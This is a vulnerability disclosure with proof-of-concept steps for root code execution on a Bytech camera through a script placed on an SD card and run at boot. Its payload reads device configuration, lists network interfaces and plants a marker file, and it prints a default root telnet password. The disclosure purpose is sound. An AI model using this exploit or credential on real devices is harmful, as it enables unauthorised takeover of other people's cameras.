# Bytech SD Card Arbitrary Code Execution
 Insecure firmware upgrade mechanism for the Bytech BY-CM-WF-101-WT that allows arbitrary code execution via an SD card. The system automatically executes scripts from `/mnt/sd/upgrade/` during boot without authentication or validation.
## Prerequisites

- Physical access to the device
- An SD card that can be formatted and written to
- A Linux system or Windows with WSL/Linux tools to prepare the SD card
- Basic knowledge of shell scripting

## Vulnerability Details

**Affected Component:** `app_init.sh` (lines 235-252)

The system automatically:
1. Checks for `/mnt/sd/upgrade/` directory on SD card during boot
2. Copies and executes `iu.sh` from SD card if present
3. Runs the script with root privileges
4. No authentication or validation is performed

## POC Instructions

### Step 1: Prepare the SD Card

1. Format the SD card with a filesystem supported by the device (vfat, exfat, ext2/3/4, or ntfs)
2. Create the required directory structure:

```bash
mkdir -p /mnt/sd_card/upgrade
cd /mnt/sd_card/upgrade
```

### Step 2: Create Malicious Upgrade Script

Create a file named `iu.sh` in the `upgrade` directory:

```bash
cat > /mnt/sd_card/upgrade/iu.sh << 'EOF'
#!/bin/sh

# POC: Arbitrary Code Execution via SD Card Upgrade
# This script demonstrates the vulnerability

LOG_FILE="/tmp/poc_exploit.log"

echo "========================================" >> $LOG_FILE
echo "POC Exploit Executed: $(date)" >> $LOG_FILE
echo "Running as user: $(whoami)" >> $LOG_FILE
echo "Running as UID: $(id -u)" >> $LOG_FILE
echo "========================================" >> $LOG_FILE

# Demonstrate we have root access
echo "Current working directory: $(pwd)" >> $LOG_FILE
echo "Process list snippet:" >> $LOG_FILE
ps aux | head -5 >> $LOG_FILE

# Demonstrate file system access
echo "" >> $LOG_FILE
echo "System information:" >> $LOG_FILE
uname -a >> $LOG_FILE
cat /proc/version >> $LOG_FILE

# Demonstrate we can read sensitive files
echo "" >> $LOG_FILE
echo "Sensitive configuration:" >> $LOG_FILE
if [ -f /app/ap_mode.cfg ]; then
    echo "AP Mode Config:" >> $LOG_FILE
    cat /app/ap_mode.cfg >> $LOG_FILE
fi

# Demonstrate we can modify system files
echo "" >> $LOG_FILE
echo "Creating backdoor marker:" >> $LOG_FILE
touch /tmp/.poc_backdoor_installed
echo "Backdoor marker created at $(date)" >> $LOG_FILE

# Demonstrate network access (if available)
echo "" >> $LOG_FILE
echo "Network interfaces:" >> $LOG_FILE
ifconfig >> $LOG_FILE 2>&1

# Exit gracefully to avoid breaking the upgrade process
# In a real attack, this could install persistent backdoors, 
# modify firmware, exfiltrate data, etc.
exit 0
EOF

chmod +x /mnt/sd_card/upgrade/iu.sh
```

### Step 3: Create Dummy Firmware Image (Optional but Recommended)

The script checks for firmware image files. Create a minimal dummy file to satisfy the check:

```bash
# Create a minimal dummy firmware file
dd if=/dev/zero of=/mnt/sd_card/upgrade/Flash.img bs=1024 count=1
```

Alternatively, you can create an empty file:

```bash
touch /mnt/sd_card/upgrade/Flash.img
```

**Note:** The actual upgrade will fail, but the script will execute first, demonstrating the vulnerability.

### Step 4: Eject and Insert SD Card

1. Safely eject the SD card from your computer
2. Insert the SD card into the target device
3. Power on or reboot the device

### Step 6: Verify Exploit Execution

After the device boots, check if the exploit executed:

**Using Telnet shell access to the device:**

```bash
#Login as user:root with password:hellotuya
telnet <IP>

# Check if the log file was created
cat /tmp/poc_exploit.log

# Check if backdoor marker exists
ls -la /tmp/.poc_backdoor_installed

# Check process list for evidence
ps aux | grep iu.sh
```

## Expected Results

If the POC is successful, you should see:

1. Log file created at `/tmp/poc_exploit.log` containing:
   - Execution timestamp
   - User/UID information (should show root/UID 0)
   - System information
   - Network interface details
   - Configuration data (if accessible)
2. Backdoor marker file created at `/tmp/.poc_backdoor_installed`
